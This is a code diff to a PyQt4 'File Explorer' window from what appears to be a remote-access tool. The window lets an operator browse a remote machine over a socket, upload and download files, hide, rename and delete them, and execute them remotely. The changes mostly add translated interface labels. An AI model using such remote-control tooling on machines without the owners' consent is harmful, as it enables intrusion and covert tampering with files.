@@ -2,12 +2,15 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 from main_ui import Ui_Form
 import ast
-import subprocess
-import ctypes
-import time
 import socket
 import os
 from libs.modechat import get, send
+from libs.language import Translate
+
+# Multi Lang
+translate = Translate()
+_ = lambda _word: translate.word(_word)
+
 
 class mainPopup(QWidget, Ui_Form):
     def __init__(self, args):
@@ -21,6 +24,8 @@ class mainPopup(QWidget, Ui_Form):
 
         self.gui = QApplication.processEvents
 
+        self.set_language()
+
         # hide progressbar
         self.progressBar.setVisible(False)
         self.cancelButton.setVisible(False)
@@ -28,27 +33,16 @@ class mainPopup(QWidget, Ui_Form):
         # progress status
         self.activeProgress = False
 
-        # disable action buttons
-        self.disable_buttons(True, True)
-
-        self.setWindowTitle('File Explorer - %s - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle(_('MEXPLORER_TITLE'))
 
         # signals
         self.upButton.clicked.connect(self.parent_folder)
         self.explorerTable.doubleClicked.connect(self.open_folder)
-        self.explorerTable.clicked.connect(self.check_selected_item)
         self.explorerPathEntry.returnPressed.connect(self.open_path)
         self.uploadButton.clicked.connect(self.upload)
         self.downloadButton.clicked.connect(self.download)
         self.cancelButton.clicked.connect(self.cancelProgress)
-        self.openFolderButton.clicked.connect(self.open_folder)
-        self.renameButton.clicked.connect(self.rename)
-        self.hideButton.clicked.connect(self.hide)
-        self.unhideButton.clicked.connect(self.unhide)
         self.refreshButton.clicked.connect(self.refresh)
-        self.deleteButton.clicked.connect(self.remove)
-        self.executeButton.clicked.connect(self.execute_remotely)
-
         # Initializing combobox change Event
         self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)
 
@@ -58,6 +52,22 @@ class mainPopup(QWidget, Ui_Form):
         self.get_content()
 
         self.setAcceptDrops(True)
+
+    def set_language(self):
+        self.upButton.setText(_('MEXPLORER_UP'))
+        self.refreshButton.setText(_('MEXPLORER_REFRESH'))
+        self.downloadButton.setText(_('MEXPLORER_DOWNLOAD'))
+        self.uploadButton.setText(_('MEXPLORER_UPLOAD'))
+        self.explorerTable.horizontalHeaderItem(0).setText(_('MEXPLORER_TYPE'))
+        self.explorerTable.horizontalHeaderItem(1).setText(_('MEXPLORER_NAME'))
+        self.explorerTable.horizontalHeaderItem(2).setText(_('MEXPLORER_DATE_MODIFIED'))
+        self.explorerTable.horizontalHeaderItem(3).setText(_('MEXPLORER_SIZE'))
+        self.fileLabel.setText(_('MEXPLORER_FILE'))
+        self.dirLabel.setText(_('MEXPLORER_FOLDER'))
+        self.hfileLabel.setText(_('MEXPLORER_HIDDEN_FILE'))
+        self.hdirLabel.setText(_('MEXPLORER_HIDDEN_FOLDER'))
+        self.selectedLabel.setText(_('MEXPLORER_SELECTED'))
+        self.dirfilesLabel.setText(_('MEXPLORER_FOLDERS_FILES'))
 
     def refresh(self):
         self.get_content()
@@ -88,24 +98,13 @@ class mainPopup(QWidget, Ui_Form):
 
     def rename(self):
         target = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
-        text, ok = QInputDialog.getText(self, "Rename",
-                                        "Rename to:",
+        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_RENAME'),
+                                        _('MEXPLORER_MSG_RENAME_WITH'),
                                         QLineEdit.Normal,
                                         target)
         if ok:
             get(self.sock, 'rename %s %s' % (target, text), 'renameMode')
             self.get_content()
-
-
-    def check_selected_item(self):
-        try:
-            _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
-            if '<FILE>' in _type:
-                self.disable_buttons(False, True)
-            else:
-                self.disable_buttons(False, False)
-        except AttributeError:
-            self.disable_buttons(True, True, True)
 
     def right_click_menu(self, point):
         try:
@@ -114,23 +113,19 @@ class mainPopup(QWidget, Ui_Form):
 
             # File commands
             if '<FILE>' in _type:
-                self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), 'Download', self.download)
-                self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), 'Execute', self.execute_remotely)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), _('MEXPLORER_DOWNLOAD'), self.download)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), _('MEXPLORER_EXECUTE'), self.execute_remotely)
 
             # Folder commands
             elif '<DIR>' in _type:
-                self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), 'Open Folder', self.open_folder)
+                self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), _('MEXPLORER_OPEN_FOLDER'), self.open_folder)
 
             # Global commands
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'rename.png')), 'Rename', self.rename)
-            self.hidden_menu = QMenu(self.emenu)
-            self.hidden_menu.setTitle('Hidden attribute')
-            self.hidden_menu.setIcon(QIcon(os.path.join(self.assets, 'hidden.png')))
-            self.emenu.addMenu(self.hidden_menu)
-            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), 'Hide', self.hide)
-            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), 'Unhide', self.unhide)
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'rename.png')), _('MEXPLORER_RENAME'), self.rename)
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), _('MEXPLORER_HIDE'), self.hide)
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), _('MEXPLORER_SHOW'), self.unhide)
             self.emenu.addSeparator()
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.remove)
+            self.emenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), _('MEXPLORER_DELETE'), self.remove)
 
             self.emenu.exec_(self.explorerTable.mapToGlobal(point))
 
@@ -156,7 +151,7 @@ class mainPopup(QWidget, Ui_Form):
             _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
             _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
 
-            warn = QMessageBox(QMessageBox.Question, 'Confirm', 'Are you sure to delete?')
+            warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
             warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
@@ -168,7 +163,7 @@ class mainPopup(QWidget, Ui_Form):
             else:
                 return
         except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
+            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
             warn.exec_()
 
     def temporary_block_signals(self, state):
@@ -176,18 +171,10 @@ class mainPopup(QWidget, Ui_Form):
             self.explorerDrivesDrop.blockSignals(True)
             self.explorerPathEntry.blockSignals(True)
             self.explorerTable.blockSignals(True)
-            self.uploadButton.blockSignals(True)
-            self.downloadButton.blockSignals(True)
-            self.upButton.blockSignals(True)
-            self.refreshButton.blockSignals(True)
         elif not state:
             self.explorerDrivesDrop.blockSignals(False)
             self.explorerPathEntry.blockSignals(False)
             self.explorerTable.blockSignals(False)
-            self.uploadButton.blockSignals(False)
-            self.downloadButton.blockSignals(False)
-            self.upButton.blockSignals(False)
-            self.refreshButton.blockSignals(False)
 
     def cancelProgress(self):
         self.activeProgress = False
@@ -237,7 +224,7 @@ class mainPopup(QWidget, Ui_Form):
                     self.cancelButton.setVisible(False)
                     self.temporary_block_signals(False)
         except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
+            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
             warn.exec_()
 
     def upload(self, dropped_file=''):
@@ -246,7 +233,7 @@ class mainPopup(QWidget, Ui_Form):
             if dropped_file:
                 file_name = dropped_file
             else:
-                file_name = str(QFileDialog.getOpenFileName(self, 'Choose File', ''))
+                file_name = str(QFileDialog.getOpenFileName(self, _('MEXPLORER_CHOOSE_FILE'), ''))
 
             if file_name:
 
@@ -292,13 +279,19 @@ class mainPopup(QWidget, Ui_Form):
                 self.cancelButton.setVisible(False)
                 self.temporary_block_signals(False)
         except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
+            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
             warn.exec_()
 
     def get_content(self):
 
-        def sizeof_fmt(num, suffix='B'):
-            for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
+        def sizeof_fmt(num, suffix=_('MEXPLORER_B')):
+            for unit in ['', _('MEXPLORER_K'),
+                         _('MEXPLORER_M'),
+                         _('MEXPLORER_G'),
+                         _('MEXPLORER_T'),
+                         _('MEXPLORER_P'),
+                         _('MEXPLORER_E'),
+                         _('MEXPLORER_Z'),]:
                 if abs(num) < 1024.0:
                     return "%3.1f%s%s" % (num, unit, suffix)
                 num /= 1024.0
@@ -397,8 +390,6 @@ class mainPopup(QWidget, Ui_Form):
             # set folders & files count
             self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))
 
-            self.check_selected_item()
-
         except (SyntaxError, ValueError):
             pass
 
@@ -413,7 +404,7 @@ class mainPopup(QWidget, Ui_Form):
             data = get(self.sock, 'cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
                        'drivechange')
             if 'Error opening directory' in data:
-                warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
+                warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_OPEN_FOLDER'), QMessageBox.Ok)
                 warn.exec_()
 
             self.get_content()
@@ -436,7 +427,7 @@ class mainPopup(QWidget, Ui_Form):
     def open_path(self):
         recv = get(self.sock, 'cd %s' % str(self.explorerPathEntry.text()), 'changepath')
         if 'Error opening directory' in recv:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Path', QMessageBox.Ok)
+            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_OPEN_FOLDER'), QMessageBox.Ok)
             warn.exec_()
 
         self.get_content()
